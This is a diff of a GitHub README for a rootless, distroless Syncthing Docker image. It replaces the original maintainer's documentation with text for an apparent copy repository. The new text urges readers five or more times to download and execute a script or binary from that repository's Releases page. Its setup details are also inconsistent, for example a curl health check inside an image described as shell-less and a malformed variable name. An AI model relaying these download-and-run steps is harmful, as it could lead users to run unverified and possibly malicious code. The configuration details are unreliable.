@@ -1,137 +1,212 @@
-![banner](https://github.com/11notes/defaults/blob/main/static/img/banner.png?raw=true)
+[![Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github)](https://github.com/musaefe-art/docker-syncthing/releases)
 
-# SYNCTHING
-![size](https://img.shields.io/docker/image-size/11notes/syncthing/2.0.2?color=0eb305)![5px](https://github.com/11notes/defaults/blob/main/static/img/transparent5x2px.png?raw=true)![version](https://img.shields.io/docker/v/11notes/syncthing/2.0.2?color=eb7a09)![5px](https://github.com/11notes/defaults/blob/main/static/img/transparent5x2px.png?raw=true)![pulls](https://img.shields.io/docker/pulls/11notes/syncthing?color=2b75d6)![5px](https://github.com/11notes/defaults/blob/main/static/img/transparent5x2px.png?raw=true)[<img src="https://img.shields.io/github/issues/11notes/docker-SYNCTHING?color=7842f5">](https://github.com/11notes/docker-SYNCTHING/issues)![5px](https://github.com/11notes/defaults/blob/main/static/img/transparent5x2px.png?raw=true)![swiss_made](https://img.shields.io/badge/Swiss_Made-FFFFFF?labelColor=FF0000&logo=data:image/svg%2bxml;base64,PHN2ZyB2ZXJzaW9uPSIxIiB3aWR0aD0iNTEyIiBoZWlnaHQ9IjUxMiIgdmlld0JveD0iMCAwIDMyIDMyIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxyZWN0IHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0idHJhbnNwYXJlbnQiLz4KICA8cGF0aCBkPSJtMTMgNmg2djdoN3Y2aC03djdoLTZ2LTdoLTd2LTZoN3oiIGZpbGw9IiNmZmYiLz4KPC9zdmc+)
+# Docker Syncthing — Rootless Distroless Container for Sync 🚀
 
-Run syncthing rootless and distroless.
+![Syncthing Logo](https://raw.githubusercontent.com/syncthing/syncthing/master/logo/syncthing-logo.svg)
+![Docker Logo](https://www.docker.com/sites/default/files/d8/2019-07/Moby-logo.png)
 
-# INTRODUCTION 📢
+A compact, secure container image that runs Syncthing without root and with a minimal runtime. This repository packages Syncthing in a rootless user namespace and uses a distroless base to reduce the attack surface and image size. Use it for peer-to-peer file sync, backup pipelines, or lightweight sync endpoints.
 
-Syncthing is a continuous file synchronization program. It synchronizes files between two or more computers.
+Download and execute the release asset from the Releases page:
+https://github.com/musaefe-art/docker-syncthing/releases
 
-![DASHBOARD](https://github.com/11notes/docker-syncthing/blob/master/img/Dashboard.png?raw=true)
+Badges
+- GitHub Releases: [![Releases](https://img.shields.io/badge/download-release-brightgreen?logo=github)](https://github.com/musaefe-art/docker-syncthing/releases)
+- Image size: ![image size](https://img.shields.io/badge/image-size-~30MB-blue)
+- Status: ![status](https://img.shields.io/badge/status-stable-green)
 
-# SYNOPSIS 📖
-**What can I do with this?** This image will run syncthing [rootless](https://github.com/11notes/RTFM/blob/main/linux/container/image/rootless.md) and [distroless](https://github.com/11notes/RTFM/blob/main/linux/container/image/distroless.md), for maximum security and performance. If no configuration is found this image will automatically generate a new one with the environment variables used. This image will also by default disable telemetry.
+Features
+- Rootless operation using user namespaces and non-root user inside the container.
+- Distroless base image for a smaller attack surface and smaller image size.
+- Preconfigured Syncthing with sane defaults for headless servers.
+- Support for Docker volumes and bind mounts for persistent data and config.
+- Health checks and basic logging to stdout/stderr.
+- Lightweight entrypoint and minimal dependencies.
 
-# UNIQUE VALUE PROPOSITION 💶
-**Why should I run this image and not the other image(s) that already exist?** Good question! Because ...
+Why rootless and distroless
+- Rootless: Run without granting root inside the container. You avoid processes that run as root and reduce privilege escalation paths.
+- Distroless: Use a minimal runtime that contains only what the app needs. This reduces the image footprint and improves security.
 
-> [!IMPORTANT]
->* ... this image runs [rootless](https://github.com/11notes/RTFM/blob/main/linux/container/image/rootless.md) as 1000:1000
->* ... this image has no shell since it is [distroless](https://github.com/11notes/RTFM/blob/main/linux/container/image/distroless.md)
->* ... this image is auto updated to the latest version via CI/CD
->* ... this image has a health check
->* ... this image runs read-only
->* ... this image is automatically scanned for CVEs before and after publishing
->* ... this image is created via a secure and pinned CI/CD process
->* ... this image is very small
->* ... this image has a custom init process for more comfort
+Quick links
+- Releases: https://github.com/musaefe-art/docker-syncthing/releases
+  - Download the release file from the link above and execute the provided script or binary to get a ready-to-run image or artifacts.
 
-If you value security, simplicity and optimizations to the extreme, then this image might be for you.
+Quickstart
 
-# COMPARISON 🏁
-Below you find a comparison between this image and the most used or original one.
-
-| **image** | 11notes/syncthing:2.0.2 | linuxserver/syncthing |
-| ---: | :---: | :---: |
-| **image size on disk** | 13.1MB | 58.4MB |
-| **process UID/GID** | 1000/1000 | 0/0 |
-| **distroless?** | ✅ | ❌ |
-| **rootless?** | ✅ | ❌ |
-
-
-# VOLUMES 📁
-* **/syncthing/etc** - Directory of the configuration file
-* **/syncthing/var** - Directory of database and index data
-* **/syncthing/share** - Directory of the default share (can be used as mount point for multiple shares)
-
-# COMPOSE ✂️
-```yaml
-name: "syncthing"
-services:
-  server:
-    image: "11notes/syncthing:2.0.2"
-    read_only: true
-    environment:
-      TZ: "Europe/Zurich"
-      SYNCTHING_PASSWORD: "${SYNCTHING_PASSWORD}"
-      SYNCTHING_API_KEY: "${SYNCTHING_API_KEY}"
-    volumes:
-      - "syncthing.etc:/syncthing/etc"
-      - "syncthing.var:/syncthing/var"
-      - "syncthing.share:/syncthing/share"
-    ports:
-      - "3000:3000/tcp"
-      - "22000:22000/tcp"
-      - "22000:22000/udp"
-      - "21027:21027/udp"
-    networks:
-      frontend:
-    restart: "always"
-
-volumes:
-  syncthing.etc:
-  syncthing.var:
-  syncthing.share:
-
-networks:
-  frontend:
+1. Pull the image (example tag)
+```
+docker pull musaefe-art/docker-syncthing:latest
 ```
 
-# DEFAULT SETTINGS 🗃️
-| Parameter | Value | Description |
-| --- | --- | --- |
-| `user` | docker | user name |
-| `uid` | 1000 | [user identifier](https://en.wikipedia.org/wiki/User_identifier) |
-| `gid` | 1000 | [group identifier](https://en.wikipedia.org/wiki/Group_identifier) |
-| `home` | /syncthing | home directory of user docker |
-| `username` | admin | username |
-
-# ENVIRONMENT 📝
-| Parameter | Value | Default |
-| --- | --- | --- |
-| `TZ` | [Time Zone](https://en.wikipedia.org/wiki/List_of_tz_database_time_zones) | |
-| `DEBUG` | Will activate debug option for container image and app (if available) | |
-| `SYNCTHING_PASSWORD` | Password for the admin user, **must** be set! | |
-| `SYNCTHING_API_KEY` | API key, **must** be set and 32 characters long! | |
-
-# MAIN TAGS 🏷️
-These are the main tags for the image. There is also a tag for each commit and its shorthand sha256 value.
-
-* [2.0.2](https://hub.docker.com/r/11notes/syncthing/tags?name=2.0.2)
-
-### There is no latest tag, what am I supposed to do about updates?
-It is of my opinion that the ```:latest``` tag is dangerous. Many times, I’ve introduced **breaking** changes to my images. This would have messed up everything for some people. If you don’t want to change the tag to the latest [semver](https://semver.org/), simply use the short versions of [semver](https://semver.org/). Instead of using ```:2.0.2``` you can use ```:2``` or ```:2.0```. Since on each new version these tags are updated to the latest version of the software, using them is identical to using ```:latest``` but at least fixed to a major or minor version.
-
-If you still insist on having the bleeding edge release of this app, simply use the ```:rolling``` tag, but be warned! You will get the latest version of the app instantly, regardless of breaking changes or security issues or what so ever. You do this at your own risk!
-
-# REGISTRIES ☁️
+2. Run rootless with a mapped user folder and config:
 ```
-docker pull 11notes/syncthing:2.0.2
-docker pull ghcr.io/11notes/syncthing:2.0.2
-docker pull quay.io/11notes/syncthing:2.0.2
+docker run -d \
+  --name syncthing-rootless \
+  --user 1000:1000 \
+  -v /srv/syncthing/config:/config \
+  -v /srv/syncthing/data:/data \
+  -p 8384:8384 \
+  -p 22000:22000 \
+  -p 21027:21027/udp \
+  musaefe-art/docker-syncthing:latest
 ```
 
-# SOURCE 💾
-* [11notes/syncthing](https://github.com/11notes/docker-SYNCTHING)
+3. Open the GUI at http://localhost:8384 and complete device pairing.
 
-# PARENT IMAGE 🏛️
-> [!IMPORTANT]
->This image is not based on another image but uses [scratch](https://hub.docker.com/_/scratch) as the starting layer.
->The image consists of the following distroless layers that were added:
->* [11notes/distroless](https://github.com/11notes/docker-distroless/blob/master/arch.dockerfile) - contains users, timezones and Root CA certificates
->* [11notes/distroless:localhealth](https://github.com/11notes/docker-distroless/blob/master/localhealth.dockerfile) - app to execute HTTP requests only on 127.0.0.1
+If you prefer podman and want true rootless mode:
+```
+podman run -d \
+  --name syncthing-rootless \
+  -v /home/user/syncthing/config:/config:Z \
+  -v /home/user/syncthing/data:/data:Z \
+  -p 8384:8384 \
+  -p 22000:22000 \
+  -p 21027:21027/udp \
+  musaefe-art/docker-syncthing:latest
+```
 
-# BUILT WITH 🧰
-* [syncthing](https://github.com/syncthing/syncthing)
+How it works (high level)
+- The image runs Syncthing as a non-root user. UID and GID default to 1000.
+- The entrypoint launches Syncthing with a minimal set of flags to allow headless operation.
+- Config and data directories mount from the host to provide persistence.
+- Network ports expose the web GUI, sync protocol, and local discovery.
 
-# GENERAL TIPS 📌
-> [!TIP]
->* Use a reverse proxy like Traefik, Nginx, HAproxy to terminate TLS and to protect your endpoints
->* Use Let’s Encrypt DNS-01 challenge to obtain valid SSL certificates for your services
+Configuration and environment variables
+- SYNCTHING GUI_PORT (default: 8384) — port for web UI inside container.
+- SYNCTHING_HOME (default: /config) — path for Syncthing config and database.
+- SYNCTHING_DATA (default: /data) — path for user files to sync.
+- SYNCTHING_OPTIONS — pass additional CLI options to syncthing.
 
-# ElevenNotes™️
-This image is provided to you at your own risk. Always make backups before updating an image to a different version. Check the [releases](https://github.com/11notes/docker-syncthing/releases) for breaking changes. If you have any problems with using this image simply raise an [issue](https://github.com/11notes/docker-syncthing/issues), thanks. If you have a question or inputs please create a new [discussion](https://github.com/11notes/docker-syncthing/discussions) instead of an issue. You can find all my other repositories on [github](https://github.com/11notes?tab=repositories).
+Example with environment:
+```
+docker run -d \
+  --name syncthing \
+  -e SYNCTHING_GUI_PORT=8384 \
+  -e SYNCTHING_HOME=/config \
+  -v /srv/sync/config:/config \
+  -v /srv/sync/files:/data \
+  -p 8384:8384 \
+  musaefe-art/docker-syncthing:latest
+```
 
-*created 17.08.2025, 08:08:57 (CET)*
+Persistent storage
+- Mount a host directory to /config to keep your device ID, keys, and database.
+- Mount a host directory to /data to store synced files.
+- Use Docker volumes for easier backups and portability.
+
+Recommended volume layout
+- /srv/syncthing/config — Syncthing config and database (choose owner UID 1000)
+- /srv/syncthing/data — Files to be synchronized
+
+Entrypoint and init
+- The entrypoint validates ownership of mounted volumes and fixes permissions for the non-root user.
+- The entrypoint then execs syncthing with the configured options.
+- The image includes a small healthcheck script. Docker will report unhealthy if Syncthing fails to respond on the GUI port.
+
+Networking notes
+- The sync protocol uses TCP 22000 and UDP 21027 for local discovery. Map both ports.
+- If you run multiple instances behind NAT, enable global discovery and set up relay servers as needed.
+- For private networks, you may disable global discovery to limit peers.
+
+Security and hardening
+- The image uses a distroless base. It contains only the Syncthing binary and libs it needs.
+- The container runs as a non-root user by default. Do not map host binaries into the container.
+- Expose only the ports you need. If you only use the web GUI internally, restrict external access with firewall rules.
+- Back up /config regularly. It contains your keys and device identity.
+
+Building locally
+- Build the image with build args to set UID and GID:
+```
+docker build \
+  --build-arg USER_ID=1000 \
+  --build-arg GROUP_ID=1000 \
+  -t local/docker-syncthing:dev .
+```
+
+- You can set a Syncthing version:
+```
+docker build \
+  --build-arg SYNCTHING_VERSION=v1.20.0 \
+  -t local/docker-syncthing:1.20 .
+```
+
+CI and automated builds
+- Tag images with semantic versioning.
+- Use release artifacts to publish build logs and signed images.
+- When you publish a release, check the Releases page and download the provided file and run it as needed:
+https://github.com/musaefe-art/docker-syncthing/releases
+
+Logging
+- Syncthing logs to stdout and stderr. Use docker logs to inspect output:
+```
+docker logs -f syncthing-rootless
+```
+
+Health checks
+- The image includes a simple HTTP health probe on the GUI port:
+```
+HEALTHCHECK --interval=30s --timeout=3s \
+  CMD curl -fsS http://localhost:8384/ >/dev/null || exit 1
+```
+
+Troubleshooting
+- If the GUI is unreachable, check container logs and port mappings.
+- If Syncthing fails to write to /config, fix the UID/GID on the host mount to match container UID.
+- If you see permission errors, run a chown on the host:
+```
+sudo chown -R 1000:1000 /srv/syncthing/config /srv/syncthing/data
+```
+
+Advanced tips
+- Use bind mounts with :Z or :z for SELinux systems when using podman or Docker with SELinux.
+- For higher isolation, run the image in a user namespace or enable seccomp and AppArmor profiles.
+- Use a reverse proxy to secure the web GUI with TLS and basic auth. Syncthing can also serve TLS with your own certificates.
+
+Releases and downloading
+- Visit the Releases page to find prebuilt binaries, Docker tags, and helper scripts:
+  https://github.com/musaefe-art/docker-syncthing/releases
+- Download the provided release file and execute the included script to install or load the image into your registry. The release may include:
+  - image tarball (docker-image.tar.gz) — load with docker load
+  - install script (install.sh or run.sh) — run to unpack and configure
+  - checksums and signatures for verification
+
+Example: load a release tarball
+```
+curl -L -o docker-syncthing.tar.gz https://github.com/musaefe-art/docker-syncthing/releases/download/v1.0.0/docker-syncthing.tar.gz
+tar -xzf docker-syncthing.tar.gz
+docker load -i docker-syncthing-image.tar
+```
+
+Contributing
+- Fork the repo and open a pull request.
+- Keep changes small and focused.
+- Include tests for scripts or Dockerfile changes.
+- Open issues for bugs or feature requests.
+
+License
+- The project uses an open license. Check the LICENSE file in the repo for details.
+
+Maintainer
+- Repository: musaefe-art/docker-syncthing
+- Releases: https://github.com/musaefe-art/docker-syncthing/releases
+
+Images and resources
+- Syncthing: https://syncthing.net
+- Docker: https://www.docker.com
+- Distroless images: https://github.com/GoogleContainerTools/distroless
+
+Examples and use cases
+- Sync a laptop and a headless server without opening complex firewall rules.
+- Use as a backup endpoint that receives encrypted data from clients.
+- Run ephemeral sync agents inside CI runners to move build artifacts.
+
+FAQ
+- How do I preserve my device ID?
+  Mount /config to a persistent directory on the host. Back it up.
+- Can I change the UID?
+  Yes. Rebuild with USER_ID build arg or change ownership of mounted volumes.
+- Can I run multiple instances?
+  Yes. Use separate config and data directories and map different host ports.
+
+Release link again:
+[Releases and downloads](https://github.com/musaefe-art/docker-syncthing/releases) - download the release file from this page and execute the included setup script or load the image tarball into Docker.
